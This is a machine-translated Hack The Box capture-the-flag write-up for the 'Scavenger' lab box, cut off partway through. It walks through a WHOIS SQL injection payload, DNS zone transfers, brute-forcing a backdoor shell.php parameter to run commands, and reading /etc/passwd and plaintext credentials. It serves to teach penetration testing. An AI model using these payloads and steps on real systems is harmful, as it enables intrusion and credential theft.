<html>
<head>
<title>[HTB] Scavenger — Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]清道夫-报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-scavenger-write-up-fee11d971774?source=collection_archive---------0-----------------------#2020-03-02">https://infosecwriteups.com/htb-scavenger-write-up-fee11d971774?source=collection_archive---------0-----------------------#2020-03-02</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/8e2028f947f52697e7b11846cbba64bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*odxH7XGwei-MHPgtY9cF8g.png"/></div></div></figure><p id="83f4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">欢迎来到清道夫专栏！这是一个高难度的盒子，有一些有趣的组件来完全启动这个盒子。对于初始外壳，我们需要利用WHOIS SQLi来发现更多vhosts。然后，对DNS服务器进行区域转移以找到更多的域。接下来，其中一个域托管一个名为<code class="fe kz la lb lc b">shell.php</code>的脚本，我们将对其进行参数强制，以发现命令执行。对于用户升级，我们将需要做更多的寻宝游戏来找到用户的密码以收集<code class="fe kz la lb lc b">user.txt</code>文件。最后，对于根shell，我们将利用预安装的rootkit来提升我们读取<code class="fe kz la lb lc b">root.txt</code>文件的权限。此外，还有一个意外的路由，通过Exim SMTP服务器从<code class="fe kz la lb lc b">shell.php</code>访问获得即时根访问。这个我最后也会讲到:)开始吧！</p></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/c825fe445e7b532f884004a899427a5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*vU94yaemp4XNDyobHcusUg.png"/></div></figure><h1 id="c6f3" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">侦察</h1><p id="2f7e" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><h2 id="1399" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">Nmap</h2><p id="d911" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">让我们从使用以下命令进行初始端口扫描开始:</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="76d7" class="ms lq it lc b gy ni nj l nk nl">$ nmap -Pn — open -sC -sV -p- -T4 10.10.10.155</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nm"><img src="../Images/0d1dcb897a3e5e9995564e3883110560.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k1a56f0fqkq-jVkW5rB6LA.png"/></div></div></figure><p id="f262" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">值得注意的有趣端口:</p><ul class=""><li id="d885" class="nn no it kd b ke kf ki kj km np kq nq ku nr ky ns nt nu nv bi translated"><strong class="kd iu">FTP(21/TCP)</strong>—<em class="nw">*不允许匿名登录</em></li><li id="ebab" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> SMTP (25/TCP) </strong> —找到的版本<a class="ae oc" href="https://packetstormsecurity.com/files/153218/Exim-4.9.1-Remote-Command-Execution.html" rel="noopener ugc nofollow" target="_blank"> Exim 4.89 </a>易受特定RCE的攻击；然而，它无法远程利用它。但是一旦我在机器上执行了一个命令，它就被利用了。这是一个意想不到的方法，我会告诉你如何做到这一点。</li><li id="badb" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> WHOIS (43/TCP) </strong> —这是一个WHOIS服务器，可以接受来自WHOIS客户端的数据。有趣的是看到这个端口是可用的。</li><li id="30b1" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> DNS (53/TCP) </strong> —当DNS配置了TCP时，如果配置不正确，它很容易受到区域传输攻击。</li><li id="551b" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> HTTP (80/TCP) </strong> — Web服务器</li></ul></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="e320" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">最初的立足点</h1><p id="fa04" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><h2 id="88c1" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">Whois SQLi攻击(Whois-43/TCP)</h2><p id="1509" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">从最初的扫描来看，WHOIS服务器似乎是最有趣的。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="56eb" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### WHOIS</strong><br/>$ whois -h 10.10.10.155 -p 43 "scavenger.htb"</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/013b69186521d9f1a1eadf320ad25e57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*ByyGvnwAWH3D2C6G7AAbSA.png"/></div></figure><p id="15a4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">上述正常的WHOIS查询显示，它配置了<code class="fe kz la lb lc b">MariaDB10.1.37</code>。因为它使用数据库来检索数据，所以我们可以试验一下参数，看看我们是否能引起一些SQL错误来进一步攻击SQLi。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="e49a" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### WHOIS SQLi Check</strong><br/>$ whois -h 10.10.10.155 -p 43 "scavenger.htb<strong class="lc iu">'</strong>"</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oj"><img src="../Images/08ec81020772405b7d394e8d3fb4cc65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xOi6wrcYiOWCrwOLUqlIIg.png"/></div></div></figure><p id="7a73" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在<code class="fe kz la lb lc b">"scavenger.htb'"</code>加上单引号导致了一个SQL错误。使用以下基于布尔的SQLi有效负载，我们可以转储数据库内容:</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="1ef3" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### WHOIS SQLi Attack</strong><br/>$ whois -h 10.10.10.155 -p 43 "scavenger.htb') or 1=1#"</span><span id="444e" class="ms lq it lc b gy ok nj l nk nl">% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37<br/>% for more information on SUPERSECHOSTING, visit <a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">http://www.supersechosting.htb</a><br/>% This query returned 4 object<br/>   Domain Name: <strong class="lc iu">SUPERSECHOSTING.HTB</strong><br/>   Registrar WHOIS Server: whois.supersechosting.htb<br/>   Registrar URL: <a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">http://www.supersechosting.htb</a></span><span id="40a6" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="1896" class="ms lq it lc b gy ok nj l nk nl">The Registry database contains ONLY .HTB domains and<br/>--   Domain Name: <strong class="lc iu">JUSTANOTHERBLOG.HTB</strong><br/>   Registrar WHOIS Server: whois.supersechosting.htb<br/>   Registrar URL: <a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">http://www.supersechosting.htb</a></span><span id="dc7f" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="39a0" class="ms lq it lc b gy ok nj l nk nl">The Registry database contains ONLY .HTB domains and<br/>--   Domain Name: <strong class="lc iu">PWNHATS.HTB</strong><br/>   Registrar WHOIS Server: whois.supersechosting.htb<br/>   Registrar URL: <a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">http://www.supersechosting.htb</a></span><span id="c44b" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="bf67" class="ms lq it lc b gy ok nj l nk nl">The Registry database contains ONLY .HTB domains and<br/>--   Domain Name: <strong class="lc iu">RENTAHACKER.HTB</strong><br/>   Registrar WHOIS Server: whois.supersechosting.htb<br/>   Registrar URL: <a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">http://www.supersechosting.htb</a></span><span id="6f76" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span></pre><p id="d13b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">从攻击中，我们能够收集以下四(4)个额外的域:</p><ul class=""><li id="d8fc" class="nn no it kd b ke kf ki kj km np kq nq ku nr ky ns nt nu nv bi translated"><strong class="kd iu">超级选择. htb </strong></li><li id="be3b" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> justanotherblog.htb </strong></li><li id="105d" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> pwnhats.htb </strong></li><li id="d3ee" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> renahacker.htb </strong></li></ul></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h2 id="2deb" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">DNS区域传输(DNS-53/TCP)</h2><p id="1285" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">接下来，我们可以检查DNS服务器是否容易受到区域转移的攻击。如果是这样，我们可以发现更多的子域。用所有找到的域创建一个文本文件:</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/84e5a3c21c4980a306cd1e71aba83c62.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*5HFLXXWICMF3dVGSzskobw.png"/></div></figure><p id="c582" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以使用下面的bash一行程序来检查域的区域转移:</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="5cef" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Zone Transfer</strong><br/>$ while read i; do dig AXFR $i <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155; done &lt; domains.txt</span></pre><p id="e98d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">除了<code class="fe kz la lb lc b">scavenger.htb</code>域名，其他域名都很脆弱，我们现在有更多的子域名可以玩。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="c206" class="ms lq it lc b gy ni nj l nk nl">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; AXFR scavenger.htb <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155<br/>;; global options: +cmd<br/><strong class="lc iu">; Transfer failed.</strong></span><span id="655f" class="ms lq it lc b gy ok nj l nk nl">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; AXFR supersechosting.htb <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155<br/><strong class="lc iu">supersechosting.htb</strong>.       604800 IN    A       10.10.10.155<br/><strong class="lc iu">ftp.supersechosting.htb</strong>.   604800 IN    A       10.10.10.155<br/><strong class="lc iu">mail1.supersechosting.htb</strong>. 604800 IN    A       10.10.10.155<br/><strong class="lc iu">ns1.supersechosting.htb</strong>.   604800 IN    A       10.10.10.155<br/><strong class="lc iu">whois.supersechosting.htb</strong>. 604800 IN    A       10.10.10.155<br/><strong class="lc iu">www.supersechosting.htb</strong>.   604800 IN    A       10.10.10.155</span><span id="3a5d" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="af55" class="ms lq it lc b gy ok nj l nk nl">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; AXFR justanotherblog.htb <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155<br/><strong class="lc iu">justanotherblog.htb</strong>.       604800 IN    A       10.10.10.155<br/><strong class="lc iu">mail1.justanotherblog.htb</strong>. 604800 IN    A       10.10.10.155<br/><strong class="lc iu">www.justanotherblog.htb</strong>.   604800 IN    A       10.10.10.155</span><span id="80a8" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="e567" class="ms lq it lc b gy ok nj l nk nl">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; AXFR pwnhats.htb <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155<br/>;; global options: +cmd<br/><strong class="lc iu">pwnhats.htb</strong>.            604800  IN      A       10.10.10.155<br/><strong class="lc iu">mail1.pwnhats.htb</strong>.      604800  IN      A       10.10.10.155<br/><strong class="lc iu">www.pwnhats.htb</strong>.        604800  IN      A       10.10.10.155</span><span id="e943" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span><span id="471d" class="ms lq it lc b gy ok nj l nk nl">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; AXFR rentahacker.htb <a class="ae oc" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.10.155<br/>;; global options: +cmd<br/><strong class="lc iu">rentahacker.htb</strong>.        604800  IN      A       10.10.10.155<br/><strong class="lc iu">mail1.rentahacker.htb</strong>.  604800  IN      A       10.10.10.155<br/><strong class="lc iu">sec03.rentahacker.htb</strong>.  604800  IN      A       10.10.10.155<br/><strong class="lc iu">www.rentahacker.htb</strong>.    604800  IN      A       10.10.10.155</span><span id="32a0" class="ms lq it lc b gy ok nj l nk nl"><strong class="lc iu"><em class="nw">...snip...</em></strong></span></pre><p id="55a0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">让我们将所有域添加到<code class="fe kz la lb lc b">/etc/hosts</code>中，这样我们就可以访问它们了。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/b5fdf69505758fd602a36e4ac494c832.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*G-exaYrWqAcRztSmFrZQ4w.png"/></div></figure><h2 id="ba3b" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated"><a class="ae oc" href="http://www.supersechosting.htb" rel="noopener ugc nofollow" target="_blank">www . superschosting . htb</a></h2><p id="27a1" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">这是一个静态页面，从这里找不到任何性感的东西。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi on"><img src="../Images/38dbc742fcafb7ca88223dfcb7d6dd0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AKCX0WLHfcaYK4ElsF_q7A.png"/></div></div></figure><h2 id="2451" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated"><a class="ae oc" href="http://www.justanotherblog.htb" rel="noopener ugc nofollow" target="_blank">www . just another blog . htb</a></h2><p id="833e" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">这只是一个图像，也没有什么有趣的发现。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oo"><img src="../Images/13f70fa94f3460a7642a750cb0a7107d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YzgHQ2oAsSbnE4izfRRz_g.png"/></div></div></figure><h2 id="45fc" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated"><a class="ae oc" href="http://www.pwnhats.htb/" rel="noopener ugc nofollow" target="_blank"> www.pwnhats.htb </a></h2><p id="3234" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">这一页是关于卖帽子的。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi op"><img src="../Images/7c173151d19dc6181e0cee54462f595a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I-Q9Mujni8e3lPflIUVhkQ.png"/></div></div></figure><p id="b693" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">从使用<code class="fe kz la lb lc b">Dirsearch</code>工具的目录暴力破解中，我们可以找到一个<code class="fe kz la lb lc b">INSTALL.txt</code>文件，该文件公开了已安装的PrestaShop 1.7，一个开源的电子商务解决方案。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oq"><img src="../Images/35a09dae2426072fd88f50bba5953084.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XSn7rIfSQhFvZ5RENWkK6Q.png"/></div></div></figure><p id="7c2e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">除此之外，没有什么真正有趣的东西可以继续攻击。</p><h2 id="5380" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated"><a class="ae oc" href="http://www.rentahacker.htb" rel="noopener ugc nofollow" target="_blank"> www.rentahacker.htb </a></h2><p id="885f" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">这个网页似乎比其他网页更有趣，而且安装了Wordpress。然而，普通凭证(例如admin : password)并不能让我们进入管理登录门户。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi or"><img src="../Images/ed2795e5af94c73b0e776ba2f9099a5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cUT-xB_Yue9-wtxaqP86HA.png"/></div></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi os"><img src="../Images/58d05918f577e6da57d6a952cfea31f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:776/format:webp/1*JxS15ScAm_EEXMHZsjt5xA.png"/></div></figure><p id="4c56" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在评论区有一个有趣的评论，这可能表明我们需要做进一步的发现。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/6d0460a8f8cdbe4fbabb30a2ef8acc57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1122/format:webp/1*Y9jXH9omxIrKEub5hUPzMQ.png"/></div></figure><h2 id="c9c9" class="ms lq it bd lr mt mu dn lv mv mw dp lz km mx my md kq mz na mh ku nb nc ml nd bi translated">远程命令执行—Shell.php</h2><p id="b1f8" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi translated">从区域转移中，还发现了<code class="fe kz la lb lc b">sec03.rentahacker.htb</code>子域。当我们浏览那个网址时，我们会看到一个有趣的页面。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ou"><img src="../Images/b1b48be0ed2260b097d400d1aad263bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*El5CB3wUaTwCtEQ1KtDu-Q.png"/></div></div></figure><p id="bce9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在目录强制之后，我们发现了一个有趣的PHP脚本，叫做<code class="fe kz la lb lc b">shell.php</code>。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="8901" class="ms lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Dirsearch</strong><br/>$ dirsearch.py -u <a class="ae oc" href="http://sec03.rentahacker.htb/" rel="noopener ugc nofollow" target="_blank">http://sec03.rentahacker.htb/</a> -e php,txt,html | grep 200</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nm"><img src="../Images/17d2b1bc551e8b93b9d452c2ffb6b3f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dlo-u5xZ_oDAykpYfnFmeQ.png"/></div></div></figure><p id="6173" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">假设这个<code class="fe kz la lb lc b">shell.php</code> PHP脚本可能是攻击者创建的后门，并且有一个我们可以执行命令的参数，我们使用<code class="fe kz la lb lc b">Burp Suite</code>来暴力破解它。首先，捕捉<code class="fe kz la lb lc b">http://sec03.rentahacker.htb/shell.php</code>并添加<code class="fe kz la lb lc b">?test=whoami</code>。然后将它移动到打嗝入侵者并添加<code class="fe kz la lb lc b">test</code>作为蛮力点。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ov"><img src="../Images/54d3917de74a031f739e7708187afa4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z3UGa3BIFjhHlkGwEq4bPQ.png"/></div></div></figure><p id="aec4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用Kali默认的<code class="fe kz la lb lc b">/usr/share/wordlist/dirb/common.txt</code>文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ow"><img src="../Images/603d9224c4f2670b2073fdbe260599ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y1WQ0x9mbpjwbat9TxIHaQ.png"/></div></div></figure><p id="d36a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">很快，我们可以看到<code class="fe kz la lb lc b">hidden</code>用不同于其他单词的长度来响应。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/c2344c1934dacc37b9201b7c88dc4415.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*Mv-KKPec1Iw9Bc0AgRxG9Q.png"/></div></figure></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="33dd" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">用户访问#1 — ib01c03</h1><p id="d754" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><p id="0d0f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们检查响应时，可以看到<code class="fe kz la lb lc b">whoami</code>的命令输出。我们现在的用户是<code class="fe kz la lb lc b">ib01c03</code>。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oy"><img src="../Images/d5744ecea69a08a25f7c8609126b5e4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:672/format:webp/1*USfQOzKCenVkA8JT_x4DbQ.png"/></div></div></figure><p id="58a6" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们<code class="fe kz la lb lc b">cat</code>这个<code class="fe kz la lb lc b">shell.php</code>文件时，我们实际上可以确认PHP脚本。:)</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oz"><img src="../Images/ca52c54d06bba8e1b651865a79545464.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*41kF5U9fBxPw1qkVSMXhHw.png"/></div></div></figure><p id="428a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">此外，我们可以读取<code class="fe kz la lb lc b">/etc/passwd</code>文件来查看这个框中的可用用户。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pa"><img src="../Images/a892231ab0a071c86b40132703008580.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lKfoiZ-VgNQSG2rblOhyig.png"/></div></div></figure><p id="75bb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">进一步的枚举在<code class="fe kz la lb lc b">/config/config_inc.php</code>文件中找到了<code class="fe kz la lb lc b">ib01c03</code>用户的明文凭证。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pb"><img src="../Images/9e8a970d83fe056c1967831b3bfe57ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y4a0_ouzp89tvweX0emyPw.png"/></div></div></figure><p id="d207" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">虽然我们不能SSH到框中，但我们被允许访问FTP服务。此外，在FTP会话中允许目录遍历，以便我们可以移动到其他目录来浏览文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pc"><img src="../Images/7cbbc8a76fe735b2dacb20e420aeb44c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AHsGYBMBlR9Ef6kSi9HumA.png"/></div></div></figure><p id="14ee" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在<code class="fe kz la lb lc b">/var/mail</code>目录中，为<code class="fe kz la lb lc b">ib01ftp</code>用户找到了额外的凭证。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/d32e6962980b1902b046bca263b76c0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*OpYD7U7AOimgtXEOQ3QN9w.png"/></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pe"><img src="../Images/3821fd1360c0ec7752525e95baaa683a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mBO1rwTO7P5kBNiNsPSXNA.png"/></div></div></figure></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="2e31" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">用户访问#2 — ib01ftp</h1><p id="d185" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko 